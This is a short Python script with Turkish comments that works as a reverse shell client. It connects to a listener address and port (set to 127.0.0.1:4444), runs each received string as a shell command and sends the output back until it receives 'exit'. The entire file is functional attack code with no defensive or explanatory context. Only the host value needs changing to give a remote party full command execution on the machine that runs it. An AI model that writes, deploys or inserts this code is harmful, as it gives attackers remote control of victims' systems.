import socket
import subprocess

# Hedef IP ve port bilgileri
HOST = '127.0.0.1'  # Dinleyici IP
PORT = 4444          # Dinleyici portu

# Bağlantı kurma
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((HOST, PORT))

# Komutları çalıştırma
while True:
    # Dinle
    data = client.recv(1024)
    
    # Eğer 'exit' komutu gelirse, bağlantıyı kes
    if data.decode('utf-8') == 'exit':
        break
    
    # Gelen komutları çalıştır
    output = subprocess.run(data.decode('utf-8'), shell=True, capture_output=True)
    
    # Sonuçları geri gönder
    client.send(output.stdout + output.stderr)

client.close()
